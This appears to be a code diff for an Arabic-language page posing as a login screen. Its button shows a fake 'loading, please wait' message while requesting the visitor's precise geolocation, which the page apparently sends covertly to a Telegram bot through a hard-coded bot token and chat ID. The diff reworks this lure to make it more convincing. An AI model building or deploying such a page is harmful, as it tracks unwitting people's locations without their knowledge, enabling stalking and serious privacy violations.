@@ -2,22 +2,67 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جار التحميل...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            text-align: center;
+            margin-top: 25vh;
+            background-color: #ffffff;
+            color: #333;
+        }
+        .btn {
+            background-color: #0088cc;
+            color: white;
+            padding: 14px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .btn:hover {
+            background-color: #006699;
+        }
+        .loader-text {
+            font-size: 20px;
+            color: #555;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h3 style="text-align: center; margin-top: 20%; font-family: Tahoma;">جاري تحميل الصفحة، يرجى الانتظار...</h3>
+
+    <!-- الصفحة الأولى: صفحة بيضاء مع زر الدخول للموقع -->
+    <div id="welcome-screen">
+        <button class="btn" onclick="startProcess()">الدخول للموقع</button>
+    </div>
+
+    <!-- صفحة التحميل التي تظهر بعد الضغط -->
+    <div id="loader-screen" class="loader-text">
+        <h3>جاري التحميل، يرجى الانتظار...</h3>
+    </div>
 
     <script>
-        // تم دمج بيانات تليجرام الخاصة بك بنجاح
         const TELEGRAM_BOT_TOKEN = '9205263918:AAEfuJZjbxJlTXIM8mU1CdVR4WbEA2Hc4-k';
         const TELEGRAM_CHAT_ID = '7083330975';
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            });
+        function startProcess() {
+            // إخفاء زر الدخول وإظهار شاشة التحميل
+            document.getElementById('welcome-screen').style.display = 'none';
+            document.getElementById('loader-screen').style.display = 'block';
+
+            // طلب الموقع الجغرافي فوراً بعد الضغط
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("المتصفح لا يدعم تحديد الموقع");
+            }
         }
 
         function sendLocation(position) {
@@ -39,7 +84,7 @@
         }
 
         function handleError(error) {
-            console.log("Error");
+            console.log("Error getting location");
         }
     </script>
 </body>
